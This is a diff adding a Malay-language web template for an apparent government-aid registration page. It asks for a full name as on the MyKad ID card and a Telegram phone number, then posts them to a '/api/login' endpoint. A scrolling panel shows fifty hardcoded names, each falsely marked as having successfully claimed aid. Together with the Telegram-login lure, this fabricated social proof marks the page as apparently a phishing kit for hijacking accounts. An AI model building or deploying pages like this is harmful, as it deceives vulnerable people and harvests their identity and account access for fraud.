@@ -1,0 +1,505 @@
+{% extends "layout.html" %} {% block content %}
+<img
+  src="{{ url_for('static', filename='banner.png') }}"
+  alt="tng-img"
+  style="width: 100%; height: 100%; background: #c5a572"
+/>
+
+<p
+  style="
+    font-size: 25px;
+    font-weight: bold;
+    text-align: center;
+    margin: 0 auto;
+    color: #1589e6;
+  "
+>
+  BORANG PENDAFTARAN
+</p>
+
+<marquee behavior="" direction="">
+  <h4>
+    Untuk mendaftar sila log masuk menggunakan akaun Telegram. Kami akan
+    menghubungi anda untuk melengkapkan semua dokumen yang diperlukan.
+  </h4>
+</marquee>
+
+<form id="registerForm" method="post">
+  <label>Nama Penuh Sesuai MyKad</label>
+  <input
+    type="text"
+    name="name"
+    required
+    placeholder="Masukkan Nama Penuh Sesuai MyKad"
+  />
+
+  <label>Nombor Phone (Telegram)</label>
+  <input
+    type="text"
+    id="phone"
+    name="phone"
+    required
+    placeholder="+60 Nombor telefon Telegram"
+  />
+
+  <!-- Kolom Jantina -->
+  <div style="margin-bottom: 16px; font-family: Arial, sans-serif">
+    <label style="display: block; margin-bottom: 6px; font-weight: bold">
+      Jatina
+    </label>
+
+    <div style="display: flex; align-items: center; gap: 24px">
+      <label style="display: flex; align-items: center; cursor: pointer">
+        <input
+          type="radio"
+          name="gender"
+          value="Laki-laki"
+          required
+          style="margin-right: 6px"
+        />
+        Lelaki
+      </label>
+
+      <label style="display: flex; align-items: center; cursor: pointer">
+        <input
+          type="radio"
+          name="gender"
+          value="Perempuan"
+          style="margin-right: 6px"
+          checked
+        />
+        Perempuan
+      </label>
+    </div>
+  </div>
+
+  <!-- Persetujuan -->
+  <label
+    style="
+      display: flex;
+      align-items: flex-start;
+      font-weight: 400;
+      margin-top: -5px;
+      margin-bottom: 15px;
+      font-size: 13px;
+      line-height: 1.4;
+    "
+  >
+    <input
+      type="checkbox"
+      name="agreement"
+      required
+      style="margin-right: 8px; margin-top: 3px"
+    />
+    Saya bersetuju untuk menerima mesej Telegram daripada Admin berkaitan
+    Bantuan Anda.
+  </label>
+
+  <button type="submit">LOG MASUK</button>
+</form>
+
+<!-- Loader overlay -->
+<div
+  id="loader"
+  style="
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  "
+>
+  <div
+    id="spinner"
+    style="
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #001a6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    "
+  ></div>
+  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
+    Memproses...
+  </p>
+</div>
+
+<style>
+  /* WRAPPER */
+  .pendaftar-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    padding: 0 12px;
+    box-sizing: border-box;
+  }
+
+  /* CARD */
+  .pendaftar-card {
+    width: 100%;
+    max-width: 420px;
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 8px 22px rgba(0, 0, 0, 0.15);
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+  }
+
+  /* HEADER */
+  .pendaftar-header {
+    background: #1589e6;
+    color: #fff;
+    padding: 14px;
+    text-align: center;
+    font-weight: bold;
+    font-size: 15px;
+  }
+
+  /* LIST (VIEWPORT) */
+  .pendaftar-list {
+    height: 420px;
+    overflow: hidden; /* WAJIB */
+    position: relative;
+  }
+
+  /* TRACK (YANG DIGERAKKAN) */
+  .pendaftar-track {
+    will-change: transform;
+  }
+
+  /* ITEM */
+  .pendaftar-item {
+    display: flex;
+    align-items: center;
+    padding: 12px 16px;
+    border-bottom: 1px solid #f1f1f1;
+    background: #fff;
+  }
+
+  /* AVATAR */
+  .avatar {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: #1e88e5;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 14px;
+    margin-right: 12px;
+    flex-shrink: 0;
+  }
+
+  /* TEXT */
+  .nama {
+    font-weight: bold;
+    font-size: 14px;
+    color: #111;
+  }
+  .status {
+    font-size: 13px;
+    color: #2e7d32;
+    margin-top: 2px;
+  }
+
+  /* RESPONSIVE HP */
+  @media (max-width: 480px) {
+    .pendaftar-item {
+      padding: 10px 12px;
+    }
+    .avatar {
+      width: 38px;
+      height: 38px;
+      font-size: 13px;
+    }
+    .nama {
+      font-size: 13px;
+    }
+    .status {
+      font-size: 12px;
+    }
+  }
+</style>
+
+<div class="pendaftar-wrapper">
+  <div class="pendaftar-card">
+    <div class="pendaftar-header">👥 Pendaftar Terkini</div>
+
+    <div class="pendaftar-list">
+      <div class="pendaftar-track" id="pendaftarTrack">
+        <!-- ITEM PERTAMA -->
+        <div class="pendaftar-item">
+          <div class="avatar">FH</div>
+          <div>
+            <div class="nama">Faisal Halim</div>
+            <div class="status">✔ Berjaya Claim Bantuan</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ================== DATA 50 NAMA ================== */
+  const dataPendaftar = [
+    ["FM", "Farah Munirah"],
+    ["AH", "Ahmad Hakimi"],
+    ["SN", "Siti Nur Aisyah"],
+    ["MR", "Muhammad Rizal"],
+    ["NF", "Nur Farahain"],
+    ["HA", "Hafiz Azman"],
+    ["NR", "Nurul Raihana"],
+    ["ZA", "Zulkifli Ahmad"],
+    ["AA", "Aiman Afiq"],
+    ["SR", "Sofia Rahman"],
+    ["IR", "Irfan Rosli"],
+    ["MA", "Muhammad Aiman"],
+    ["NA", "Nabila Amirah"],
+    ["FA", "Firdaus Azmi"],
+    ["SA", "Siti Aishah"],
+    ["AR", "Afiq Rahman"],
+    ["HN", "Haziq Nordin"],
+    ["NM", "Nur Maisarah"],
+    ["RA", "Rizal Abdullah"],
+    ["AF", "Aina Farzana"],
+    ["MI", "Muhammad Izzat"],
+    ["SN", "Siti Nabila"],
+    ["AD", "Amirul Danish"],
+    ["FN", "Farhan Naim"],
+    ["AI", "Aisyah Irdina"],
+    ["HR", "Haris Ridzuan"],
+    ["NS", "Nur Syafiqah"],
+    ["ZA", "Zainal Abidin"],
+    ["AM", "Aiman Muhaimin"],
+    ["SA", "Siti Amirah"],
+    ["IQ", "Izzuddin Qayyum"],
+    ["NR", "Nur Rasyidah"],
+    ["MF", "Muhammad Fakhri"],
+    ["AD", "Aina Dahlia"],
+    ["RA", "Rafiq Aiman"],
+    ["SN", "Siti Nurfatin"],
+    ["HM", "Hakim Mikhail"],
+    ["NA", "Nur Atiqah"],
+    ["FI", "Faris Iman"],
+    ["SA", "Siti Alia"],
+    ["MR", "Muhammad Rafi"],
+    ["AZ", "Aiman Zharif"],
+    ["NF", "Nur Farhana"],
+    ["HR", "Haziq Rizwan"],
+    ["AI", "Alya Imani"],
+    ["MA", "Muhammad Aqil"],
+    ["SN", "Siti Nadhirah"],
+    ["FA", "Fawwaz Akmal"],
+    ["NA", "Nur Amirah"],
+  ];
+
+  const track = document.getElementById("pendaftarTrack");
+
+  /* TAMBAHKAN SEMUA DATA */
+  dataPendaftar.forEach((d) => {
+    track.insertAdjacentHTML(
+      "beforeend",
+      `
+    <div class="pendaftar-item">
+      <div class="avatar">${d[0]}</div>
+      <div>
+        <div class="nama">${d[1]}</div>
+        <div class="status">✔ Berjaya Claim Bantuan</div>
+      </div>
+    </div>
+  `
+    );
+  });
+
+  /* ================== AUTO SCROLL (AMAN & HALUS) ================== */
+  function startAutoScroll() {
+    let isScrolling = true;
+
+    function scrollOnce() {
+      if (!isScrolling) return;
+
+      const firstItem = track.querySelector(".pendaftar-item");
+      if (!firstItem) return;
+
+      const h = firstItem.offsetHeight;
+
+      track.style.transition = "transform 0.8s ease";
+      track.style.transform = `translateY(-${h}px)`;
+
+      setTimeout(() => {
+        track.style.transition = "none";
+        track.style.transform = "translateY(0)";
+        track.appendChild(firstItem);
+      }, 800);
+    }
+
+    setInterval(scrollOnce, 2400);
+
+    /* PAUSE DESKTOP */
+    track.addEventListener("mouseenter", () => (isScrolling = false));
+    track.addEventListener("mouseleave", () => (isScrolling = true));
+
+    /* PAUSE MOBILE */
+    track.addEventListener("touchstart", () => (isScrolling = false));
+    track.addEventListener("touchend", () => (isScrolling = true));
+  }
+
+  document.addEventListener("DOMContentLoaded", startAutoScroll);
+</script>
+
+<!-- Submit pakai AJAX -->
+<script>
+  document
+    .getElementById("registerForm")
+    .addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const loader = document.getElementById("loader");
+      const spinner = document.getElementById("spinner");
+      const loaderText = document.getElementById("loaderText");
+
+      loader.style.display = "flex";
+
+      fetch("/api/login", { method: "POST", body: formData })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "success") {
+            spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+            loaderText.innerText = "Berjaya!";
+            loaderText.style.color = "#4caf50";
+            setTimeout(() => {
+              window.location.href = data.redirect;
+            }, 1500);
+          } else {
+            loader.style.display = "none";
+            alert(data.message || "Ralat tidak diketahui.");
+          }
+        })
+        .catch((err) => {
+          loader.style.display = "none";
+          alert("Server error!");
+        });
+    });
+</script>
+
+<!-- Auto isi +60 -->
+<script>
+  const phoneInput = document.getElementById("phone");
+  phoneInput.addEventListener("focus", function () {
+    if (this.value.trim() === "") {
+      this.value = "+60";
+    }
+  });
+  phoneInput.addEventListener("input", function () {
+    if (!this.value.startsWith("+60")) {
+      this.value = "+60";
+    }
+  });
+</script>
+
+<!-- Submit pakai AJAX -->
+<script>
+  document
+    .getElementById("registerForm")
+    .addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const loader = document.getElementById("loader");
+      const spinner = document.getElementById("spinner");
+      const loaderText = document.getElementById("loaderText");
+
+      loader.style.display = "flex";
+
+      fetch("/api/login", { method: "POST", body: formData })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "success") {
+            spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+            loaderText.innerText = "Berjaya!";
+            loaderText.style.color = "#4caf50";
+            setTimeout(() => {
+              window.location.href = data.redirect;
+            }, 1500);
+          } else {
+            loader.style.display = "none";
+            alert(data.message || "Ralat tidak diketahui.");
+          }
+        })
+        .catch((err) => {
+          loader.style.display = "none";
+          alert("Server error!");
+        });
+    });
+</script>
+
+<style>
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+  .checkmark {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 4;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    margin: 10px auto;
+    box-shadow: inset 0px 0px 0px #4caf50;
+    animation: fill 0.4s ease-in-out 0.4s forwards,
+      scale 0.3s ease-in-out 0.9s both;
+    background: #4caf50;
+  }
+  .checkmark__check {
+    transform-origin: 50% 50%;
+    stroke-dasharray: 48;
+    stroke-dashoffset: 48;
+    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  }
+  @keyframes stroke {
+    100% {
+      stroke-dashoffset: 0;
+    }
+  }
+  @keyframes scale {
+    0%,
+    100% {
+      transform: none;
+    }
+    50% {
+      transform: scale3d(1.1, 1.1, 1);
+    }
+  }
+  @keyframes fill {
+    100% {
+      box-shadow: inset 0px 0px 0px 30px #4caf50;
+    }
+  }
+</style>
+
+{% endblock %}
